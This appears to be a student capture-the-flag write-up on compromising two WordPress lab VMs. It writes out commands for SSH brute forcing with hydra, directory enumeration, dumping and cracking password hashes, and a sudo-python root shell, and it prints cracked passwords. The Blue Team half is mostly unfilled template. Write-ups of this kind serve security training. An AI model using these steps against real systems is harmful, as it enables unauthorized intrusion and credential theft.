# Red Team: Summary of Operations

The network depicted below was used to test exploits and determine vulnerabilities within the WordPress servers.
![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/Final%20Proj%20Topology%20(Updated).png)
Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

# Exposed Services

The nmap scan outlined below identifies the potential points of entry:

nmap $ nmap -sC -sV 192.168.1.110

Target 1:
- Port 22 / SSH
- Port 80 / http
- Port 111 / rpcbind

![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/nmap%20vm1.png)

nmap $ nmap -sC -sV 192.168.1.115

Target 2:
- Port 22 / SSH
- Port 80 / http
- Port 111 / rpcbind

![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/NMAP%20final%20Project.png)

# Critical Vulnerabilities

The following vulnerabilities were identified on each target:

Target 1
- CVE-2019-12215 Full Path Disclosure (192.268.1.110/var/www/html/vendor)
- CVE-2019-15653 html password disclosure - The password hash is viewable in plaintext (192.168.1.110/service.html)
- Wpscan exposed username which allowed brute force of password information.  User access to the wp-config.php file via nano.  This exposed the root user and password.

Target 2
- CVE-2019-12215 Full Path Disclosure (192.168.1.115/vendor/PATH)
- CVE-2015-8476 Php mailer (192.168.1.115/vendor/PHPMailerAutoload.php)

# Exploitation

The Red Team was able to penetrate both Target 1 and Target 2 and retrieve the following confidential data:

Target 1

Before we began, we ran an enumeration scan to uncover the users and hidden directories within the Target.  
- Command used: wpscan --url http://192.168.1.110/wordpress --wp-content-dir -at -eu 
- This command uncovered user names steven and michael.  
   ![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/VM1%20wpscan%20michael.png)

- Once I obtained the usernames I was able to run a hydra command to obtain the password.  As noted above, port 22 is open so I wanted to obtain the password that could be used to SSH into the machine.
- Command used: hydra -l michael -P /usr/share/john/password.lst -vV 22:192.168.1.110
- This command exposed "michael" as the password for the username "michael".  Utilizing ssh michael@192.168.1.110 with password "michael" I was able to gain access to Target 1.  
   
- flag1.txt: 9bbcb33e11b80be759c4e844862482
   - dirbuster was used to uncover the file path that led to the flag exposure.  http://192.168.1.110/service.html.  Utilizing inspector it was uncovered the flag was exposed in plain text.
   - dirbuster command: dirbuster -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -u http://192.168.1.110
   
![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/flag%201%20vm1.png)
     
- flag2.txt: fc3fd58dcdad9ab23faca6e9a36e581c
   - gobuster exposed directory path (flag was discovered at 192.168.1.110/vendor/PATH)
   - gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -e -u http://192.168.1.110 
   
![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/gobuster%20vm1.png)
     
![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/VM2%20Index_Vendor.png)
     
![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/dirbuster%20path%20to%20flag2.png)    
     
- flag3.txt: afc01ab56b50591e7dccf93122770cd2
  - I was able to expose the username and password for the MySQL database once I discovered I had access to the wp-config.php file while logged in as michael.
  
![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/nano%20wp-config.png) 
    
![TODO:](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/Find%20IP%20for%20mysql.png) 
    
- command: mysql -u root -p wordpress   
- Once I entered this command it prompted me to enter my password.  Using the root password above I was able to login to the mysql database.  
- From there I searched through the tables to see if I found anything interesting.  I found what I was looking for by running the following commands:
  - -> show databases; -> use wordpress -> show tables; -> select * from wp_posts
  - Flag 3 was exposed with this step.  

![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/Flag%203.png)

- flag4.txt: 715dea6c055b9fe3337544932f2941ce
  - I used the following commands to exposer the usernames and hash values of the user table:
  ->show tables; -> select * from wp_users; -> 
  
![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/wp%20users%20steven%20VM1.png)
  
   -  2 usernames were displayed for michael and steven.  Based on me already having the password for michael I wanted to obtain the password for steven.  I exited back to my root login to run john the ripper.  I added the hash to a txt file I named "hash.txt".  I then ran john hash.txt to translate steven’s hash into password “pink84” 

![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/steven%20password%20pink84.png)

-> logged in with steven’s credentials ->ssh steven@192.168.1.110 -> by entering sudo -l I was able to determine I could utilize python while logged in as steven via usr/bin/python.  This would also allow some priveledge escalation.  From there I accessed the tmp file with cd ~/tmp.  I then ran a wget command to obtain the exploit I wanted to use.  wget https://raw.githubusercontent.com/mzet-/linux.exploit-suggester/master/linux-exploit-suggester.sh.  Once the download was completed I entered ls to ensure the exploit was there les.sh was visible.  I then needed to update permissions to run the command by entering chmod 775 les.sh.  I then ran the command with ./les.sh.  This gave me the potential exploits to utilize.  
I then entered the following commands:
   - sudo /usr/bin/python -> import os -> os.system(‘ /bin/bash’) 
   - This allowed me to gain root access.
   - Once logged in I used the command cd ~/root -> ls -> cat flag4.txt

![TODO:](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/flag%204%20from%20root.png)

Target 2

Target 2 was much more challenging.  I was able to uncover the usernames as michael and steven.  However, the same hydra command didn't work to obtain the password for port 22 (ssh).  I was able to obtain a password through http-get, however that didn't work with the ssh command option.  I tried to also obtain the password through some exploits, but didn't have any luck.  I need to continue to study python so I can determine where I may be missing options to help in this area.  Here is what I was able to uncover through some process of elimination.  I did uncover 2 of the 4 flags on this Target.

- flag1.txt: a2c1f66d2b8051bd3a5874b5b6e43e21
 - gobuster - exposed directory path (flag was discovered at 192.168.1.115/vendor/PATH)
 - Command used: 
   - gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -e -u http://192.168.1.115
   
![TODO:](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/gobuster%20vm2.png) 
   
![TODO:](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/VM2%20Index_Vendor.png) 

![TODO:](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/Flag1%20VM%202.png)    

- flag2.txt: UNABLE TO LOCATE
   
- flag3.txt:  a0f568aa9de277887f377887f37730d71520d9b
 - Exploit Used
   dirbuster - exposed directory path (flag was discovered at 192.168.1.115/wordpress/wp-content/uploads/2018/11/)
    dirbuster -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -u http://192.168.1.115
   
![TODO:](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/VM2%20Flag%203%20Location.png)   

![TODO:](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/VM2%20Flag%203.png)

- flag4.txt: UNABLE TO LOCATE

# Blue Team: Summary of Operations

Below we will outline the following:
- Description of Targets
- Monitoring the Targets
- Patterns of Traffic and Behavior
- Suggestions for Going Further

Network Topology
![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/Final%20Proj%20Topology%20(Updated).png)

The following machines were identified on the network:

Raven 1:
- Purpose: Apache Web Server
- IP Address: 192.168.1.110

Raven 2:
- Purpose: Apache Web Server
- IP Address: 192.168.1.115

- Note: Each VM has SSH enabled, so ports 80 and 22 are possible ports of entry for attackers.

Monitoring the Targets
- This scan identifies the services below as potential points of entry:

  - Traffic to these services should be carefully monitored. To this end, we have implemented the alerts below: (Note: Add at least three alerts. You can add more if time allows.)

SSH login attempts (Filebeat System)

![TODO: Update the path with the name of your diagram](html)

Metric: TODO
Threshold: TODO
Vulnerability Mitigated: TODO
Reliability: TODO: Does this alert generate lots of false positives/false negatives? Rate as low, medium, or high reliability.

![TODO: Update the path with the name of your diagram](html)

Name of Alert 2

[Name of Alert 2] is implemented as follows:

Metric: TODO
Threshold: TODO
Vulnerability Mitigated: TODO
Reliability: TODO: Does this alert generate lots of false positives/false negatives? Rate as low, medium, or high reliability.

![TODO: Update the path with the name of your diagram](html)



Name of Alert 3

[Name of Alert 3] is implemented as follows:

Metric: TODO
Threshold: TODO
Vulnerability Mitigated: TODO
Reliability: TODO: Does this alert generate lots of false positives/false negatives? Rate as low, medium, or high reliability.

![TODO: Update the path with the name of your diagram](html)

Name of Alert 4

[Name of Alert 3] is implemented as follows:

Metric: TODO
Threshold: TODO
Vulnerability Mitigated: TODO
Reliability: TODO: Does this alert generate lots of false positives/false negatives? Rate as low, medium, or high reliability.

![TODO: Update the path with the name of your diagram](html)

Name of Alert 5

[Name of Alert 3] is implemented as follows:

Metric: TODO
Threshold: TODO
Vulnerability Mitigated: TODO
Reliability: TODO: Does this alert generate lots of false positives/false negatives? Rate as low, medium, or high reliability.

![TODO: Update the path with the name of your diagram](html)Note: If time allows, add more alerts. 

Name of Alert 6

[Name of Alert 3] is implemented as follows:

Metric: TODO
Threshold: TODO
Vulnerability Mitigated: TODO
Reliability: TODO: Does this alert generate lots of false positives/false negatives? Rate as low, medium, or high reliability.

![TODO: Update the path with the name of your diagram](html)Note: If time allows, add more alerts. 
Suggestions for Going Further

Suggest a patch for each vulnerability identified by the alerts above. Remember: alerts only detect malicious behavior. They do not prevent it. It is not necessary to explain how to implement each patch.

The logs and alerts generated during the assessment suggest that this network is susceptible to several active threats. In addition to watching for occurrences of such threats, the network should be hardened against them. The Blue Team suggests that IT implement the fixes below to protect the network:

Vulnerability 1
Patch: [For example: install special-security-package with apt-get]
Why It Works:  [For example: special-security-package scans the system for viruses every day]

Vulnerability 2
Patch:
Why It Works:

Vulnerability 3
Patch: 
Why It Works: 

Overall this was a great CTF challenge.  As a noob, I enjoyed hunting through and trying various exploits and search options to hunt down the flags and review the incident response side as well. I will continue various challenges to continue to improve my skills.

